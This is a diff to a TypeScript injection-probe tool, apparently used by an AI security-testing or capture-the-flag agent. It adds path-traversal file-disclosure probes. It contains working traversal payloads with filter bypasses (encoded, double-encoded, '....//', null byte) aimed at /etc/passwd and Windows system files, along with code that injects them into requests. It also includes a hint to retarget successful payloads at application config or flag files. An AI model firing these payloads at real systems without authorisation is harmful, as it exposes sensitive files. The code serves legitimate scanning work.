@@ -197,6 +197,45 @@ const CMD_NOT_TESTED = [
   "non-query/non-form injection points (path, header, cookie, JSON, XML, GraphQL, multipart)",
 ]
 
+// ── LFI / path-traversal: read-only file-DISCLOSURE probes (Linux + Windows) ──
+// HARD BOUNDARY: disclosure only. Well-known OS files (never an attacker-chosen path), read-only.
+// NO wrappers (php://, data://, expect://, phar://), NO RFI (http://…), NO write/RCE/OOB — that line
+// is disclosure⇄exploitation. The tool confirms the WORKING traversal SHAPE (the filter bypass)
+// against a known OS file; the agent then swaps in the app-specific target (FLAG.php, config…).
+const LFI_DEPTH = 12 // one deep traversal reaches root from any realistic web-dir depth (extra ../ at root = no-op)
+const LFI_TARGETS: { file: string; sig: RegExp; os: "unix" | "windows" }[] = [
+  { file: "etc/passwd", sig: /root:[^:\r\n]*:0:0:/, os: "unix" },
+  { file: "windows/win.ini", sig: /\[fonts\]|\[extensions\]|for 16-bit app support/i, os: "windows" },
+  { file: "windows/system32/drivers/etc/hosts", sig: /# Copyright.{0,40}Microsoft|127\.0\.0\.1\s+localhost/i, os: "windows" },
+  { file: "boot.ini", sig: /\[boot loader\]/i, os: "windows" },
+]
+// technique = how "up N levels" + the file are written ON THE WIRE (verbatim — no re-encoding). `fwd`
+// = forward slash (unix; also accepted by Windows), `back` = backslash (Windows). `bs()` converts the
+// file's separators to match. A unix target fires only `fwd`; a Windows target fires both.
+const LFI_TECHNIQUES: { name: string; slash: "fwd" | "back"; make: (f: string) => string }[] = [
+  { name: "../", slash: "fwd", make: (f) => "../".repeat(LFI_DEPTH) + f },
+  { name: "..\\", slash: "back", make: (f) => "..\\".repeat(LFI_DEPTH) + f.replace(/\//g, "\\") },
+  { name: "..%2f", slash: "fwd", make: (f) => "..%2f".repeat(LFI_DEPTH) + f },
+  { name: "..%5c", slash: "back", make: (f) => "..%5c".repeat(LFI_DEPTH) + f.replace(/\//g, "\\") },
+  { name: "%2e%2e%2f", slash: "fwd", make: (f) => "%2e%2e%2f".repeat(LFI_DEPTH) + f },
+  { name: "..%252f", slash: "fwd", make: (f) => "..%252f".repeat(LFI_DEPTH) + f }, // double-encoded
+  { name: "....//", slash: "fwd", make: (f) => "....//".repeat(LFI_DEPTH) + f }, // single-strip bypass
+  { name: "....\\\\", slash: "back", make: (f) => "....\\\\".repeat(LFI_DEPTH) + f.replace(/\//g, "\\") }, // single-strip win
+  { name: "null-byte", slash: "fwd", make: (f) => "../".repeat(LFI_DEPTH) + f + "%00" }, // legacy PHP
+]
+const LFI_ABSOLUTE: { name: string; make: (f: string) => string; os: "unix" | "windows" }[] = [
+  { name: "absolute /", make: (f) => "/" + f, os: "unix" },
+  { name: "absolute C:\\", make: (f) => "C:\\" + f.replace(/\//g, "\\"), os: "windows" },
+  { name: "absolute C:/", make: (f) => "C:/" + f, os: "windows" },
+]
+const LFI_NOT_TESTED = [
+  "wrapper-based inclusion (php://, data://, expect://, phar://) — RCE-capable, deliberately excluded",
+  "remote file inclusion (RFI, http://…) — SSRF/OOB, deliberately excluded",
+  "app-specific target files — the tool confirms the traversal SHAPE against known OS files; swap in FLAG.php/config yourself",
+  "same-directory sibling read WITHOUT traversal (e.g. filename=secret in a served dir)",
+  "second-order / archive-extraction (zip-slip) / upload-then-include chains",
+]
+
 // ── error-signature classes (sqli / nosql / ldap / xpath) ──
 // The probe fires a battery of payloads and reports, as raw facts, which elicited that class's
 // error signature or a boolean-differential. Safety envelope: no stacked queries (`;`), no write
@@ -634,6 +673,58 @@ function setMultipartOperator(body: string, boundary: string, name: string, opKe
     return segments.join(delim)
   }
   return null
+}
+
+// LFI / path-traversal application: place the payload VERBATIM (no url-encoding) so `../`, `..\`,
+// `%2f`, `%252f`, `%00` survive to the wire exactly as written — the technique string IS the wire
+// form. (query/form values are normally re-encoded, which would corrupt a traversal payload.)
+function applyLfiTarget(
+  r: ResolvedRequest,
+  point: InjPoint,
+  value: string,
+): { url: string; body: string; headers: Record<string, string> } {
+  const headers = { ...r.headers }
+  const u = new URL(r.url.toString())
+  const origin = `${u.protocol}//${u.host}${u.pathname}`
+  const enc = (s: string) => encodeURIComponent(s)
+  let body = r.body
+  switch (point.location) {
+    case "query": {
+      const parts: string[] = []
+      for (const [k, v] of u.searchParams) if (k !== point.name) parts.push(`${enc(k)}=${enc(v)}`)
+      parts.push(`${enc(point.name)}=${value}`) // value VERBATIM
+      return { url: `${origin}?${parts.join("&")}`, body, headers }
+    }
+    case "form_field": {
+      if (r.contentType.includes("multipart/form-data")) {
+        const b = multipartBoundary(r)
+        return { url: u.toString(), body: (b && setMultipartField(r.body, b, point.name, value)) ?? r.body, headers }
+      }
+      const f = new URLSearchParams(r.body)
+      const parts: string[] = []
+      for (const [k, v] of f) if (k !== point.name) parts.push(`${enc(k)}=${enc(v)}`)
+      parts.push(`${enc(point.name)}=${value}`)
+      return { url: u.toString(), body: parts.join("&"), headers }
+    }
+    case "json_body":
+      return { url: u.toString(), body: setJsonValue(r.body, point.name, value), headers }
+    case "path": {
+      // replace the target segment VERBATIM (fetch still collapses a literal `../` in the PATH — the
+      // ENCODED techniques `..%2f`/`..%252f` survive there; raw `../` is best delivered via query).
+      const segs = u.pathname.split("/")
+      const nonEmpty: number[] = []
+      for (let i = 0; i < segs.length; i++) if (segs[i] !== "") nonEmpty.push(i)
+      const t = nonEmpty[Number(point.name)]
+      if (t != null) segs[t] = value
+      return { url: `${u.protocol}//${u.host}${segs.join("/")}${u.search}`, body, headers }
+    }
+    case "header":
+      headers[point.name.toLowerCase()] = value.replace(/[\r\n]/g, "")
+      return { url: u.toString(), body, headers }
+    case "cookie":
+      headers["cookie"] = setCookie(headers["cookie"] ?? "", point.name, value.replace(/[\r\n;]/g, ""))
+      return { url: u.toString(), body, headers }
+  }
 }
 
 // Apply one payload at one point → the full mutated {url, body, headers}. Location-specific
@@ -1143,6 +1234,7 @@ const TESTED_LABEL: Record<string, string> = {
   nosql: "nosql: error-signature",
   ldap: "ldap: error-signature",
   xpath: "xpath: error-signature",
+  lfi: "lfi: read-only path-traversal file-disclosure (Linux + Windows)",
 }
 const NOT_TESTED_BY_CLASS: Record<string, string[]> = {
   xss: XSS_NOT_TESTED,
@@ -1152,6 +1244,7 @@ const NOT_TESTED_BY_CLASS: Record<string, string[]> = {
   nosql: ERRSIG_NOT_TESTED,
   ldap: ERRSIG_NOT_TESTED,
   xpath: ERRSIG_NOT_TESTED,
+  lfi: LFI_NOT_TESTED,
 }
 
 // ── error-signature observation (sqli/nosql/ldap/xpath): facts about which payloads broke ──
@@ -1176,6 +1269,77 @@ interface ErrSigObservation {
   }[]
   blocked: boolean
   note?: string
+}
+
+// ── LFI observation: did a read-only traversal payload disclose a known OS file? ──
+interface LfiObservation {
+  point: string
+  baseline: { status: number; bytes: number; ms: number }
+  // traversal/absolute payloads whose response matched a known OS-file signature — the WORKING
+  // filter-bypass SHAPE. A fact (with the matched snippet), not a verdict. Content-signature only,
+  // so a decoy/placeholder that merely echoes the payload can't be mistaken for a real read.
+  findings: { target: string; technique: string; os: string; payload: string; snippet: string }[]
+  blocked: boolean
+  block_signal?: string
+  note?: string
+}
+
+async function probeLfiPoint(
+  r: ResolvedRequest,
+  point: InjPoint,
+  abort: AbortSignal,
+  delayMs: number,
+  budget: SendBudget,
+): Promise<LfiObservation> {
+  const obs: LfiObservation = { point: `${point.location}:${point.name}`, baseline: { status: 0, bytes: 0, ms: 0 }, findings: [], blocked: false }
+  const sleep = (ms: number) => (ms ? new Promise((res) => setTimeout(res, ms)) : Promise.resolve())
+  const bl = await send(r, applyLfiTarget(r, point, "1"), abort, budget)
+  if ("error" in bl) {
+    obs.note = `baseline failed: ${bl.error}`
+    if (bl.timeout) obs.block_signal = "timeout/reset (possible WAF)"
+    return obs
+  }
+  const bsig = blockSignal(bl)
+  if (bsig) {
+    obs.blocked = true
+    obs.block_signal = bsig
+    obs.note = `baseline ${bsig} — NOT evidence of safety`
+    return obs
+  }
+  obs.baseline = { status: bl.status, bytes: bl.text.length, ms: bl.ms }
+  // Suppress any target whose signature is ALREADY in the baseline (a config/help/networking page can
+  // contain `[fonts]`, `127.0.0.1 localhost`, etc.) — otherwise every payload response would match and
+  // FALSE-flag. A real read must make the signature appear that WASN'T there before.
+  const inert = new Set(LFI_TARGETS.filter((t) => t.sig.test(bl.text)).map((t) => t.file))
+  if (inert.size) obs.note = `baseline already contains ${[...inert].join(", ")} signature(s) — those targets suppressed (can't tell an echo from a read)`
+  // OS-appropriate combos: each target × (its techniques + matching absolutes). unix never backslash.
+  const combos: { target: (typeof LFI_TARGETS)[number]; name: string; payload: string }[] = []
+  for (const target of LFI_TARGETS) {
+    for (const tech of LFI_TECHNIQUES) {
+      if (target.os === "unix" && tech.slash === "back") continue
+      combos.push({ target, name: tech.name, payload: tech.make(target.file) })
+    }
+    for (const abs of LFI_ABSOLUTE) if (abs.os === target.os) combos.push({ target, name: abs.name, payload: abs.make(target.file) })
+  }
+  for (const c of combos) {
+    if (abort.aborted || budget.sent >= budget.max) break
+    const res = await send(r, applyLfiTarget(r, point, c.payload), abort, budget)
+    if ("error" in res) {
+      if (res.timeout && !obs.block_signal) obs.block_signal = "timeout/reset (possible WAF)"
+      continue
+    }
+    const blk = blockSignal(res)
+    if (blk) {
+      obs.blocked = true
+      obs.block_signal ??= blk
+      continue
+    }
+    if (inert.has(c.target.file)) continue // signature was already in the baseline — unreliable here
+    const m = c.target.sig.exec(res.text)
+    if (m) obs.findings.push({ target: c.target.file, technique: c.name, os: c.target.os, payload: c.payload, snippet: excerptAround(res.text, m.index, m[0].length) })
+    await sleep(delayMs)
+  }
+  return obs
 }
 
 async function probeErrorSigPoint(
@@ -1317,7 +1481,7 @@ export const InjectProbeTool = Tool.define("inject_probe", {
       .optional()
       .describe("Fallback when the target is NOT a stored request (a new/unseen endpoint). Provide EITHER request_id OR target."),
     vuln_type: z
-      .array(z.enum(["xss", "ssti", "cmd", "sqli", "nosql", "ldap", "xpath"]))
+      .array(z.enum(["xss", "ssti", "cmd", "sqli", "nosql", "ldap", "xpath", "lfi"]))
       .min(1)
       .describe(
         "Injection classes to probe — YOU pick the set that fits THIS endpoint (don't run every class everywhere; e.g. no xpath on a plain REST/JSON API). xss/ssti/cmd return execution-facts; sqli/nosql/ldap/xpath return error-signature (sqli also a safe AND-based boolean-differential) facts. The tool never exploits — it hands you leads.",
@@ -1447,6 +1611,12 @@ export const InjectProbeTool = Tool.define("inject_probe", {
           markBlocked(o, cls)
           if (o.command_output.length > 0)
             leads.push(`cmd @ ${o.point}: separator(s) [${o.command_output.map((c) => c.separator).join(", ")}] returned command output (snippet in command_output) — confirm + enumerate.`)
+        } else if (cls === "lfi") {
+          const o = await probeLfiPoint(resolved, point, ctx.abort, DELAY, budget)
+          classObs.push(o)
+          markBlocked(o, cls)
+          if (o.findings.length > 0)
+            leads.push(`lfi @ ${o.point}: READY traversal(s) disclosed a known OS file — technique [${[...new Set(o.findings.map((x) => x.technique))].join(", ")}] read ${[...new Set(o.findings.map((x) => x.target))].join(", ")}. Payload: ${o.findings[0].payload} — this SHAPE beat the filter; swap in the app target (FLAG.php/config).`)
         } else {
           const o = await probeErrorSigPoint(resolved, point, cls, ctx.abort, DELAY, budget)
           classObs.push(o)
